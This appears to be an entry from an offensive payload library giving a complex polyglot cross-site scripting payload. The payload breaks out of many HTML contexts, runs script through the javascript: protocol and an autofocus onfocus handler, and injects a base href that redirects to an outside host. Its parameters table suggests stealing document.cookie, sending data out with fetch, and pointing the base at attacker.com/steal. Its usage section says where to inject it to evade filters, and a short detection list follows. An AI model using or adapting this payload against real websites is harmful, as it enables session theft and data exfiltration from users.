---
id: 5e7fac5d-d9c0-4569-81d2-e03e466e3021
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.286477+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - polyglot
  - complex
platforms:
  - Web
validated: true
---

# Complex-JavaScript-Polyglot-XSS-with-Base-Href

## Code

```javascript
JavaScript://%250Aalert?.(1)//'/*\'/*\"/*\\\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

## Description

Advanced polyglot using JavaScript: protocol, optional chaining (alert?.), encoded breakers, and base href redirection to execute alert via focus or template literals.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert?.(1) | Modern JS POC; replace | alert?.(document.cookie) or fetch for exfil |
| //X55.is\76 | Fake href; point to attacker | //attacker.com/steal?data=\74base\76 |

## Usage

Inject into links, iframes, or editable content; leverages modern JS features for evasion.

## Detection

- Optional chaining ?. in payloads.
- Base href manipulations.
- Encoded entities like %26apos;.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
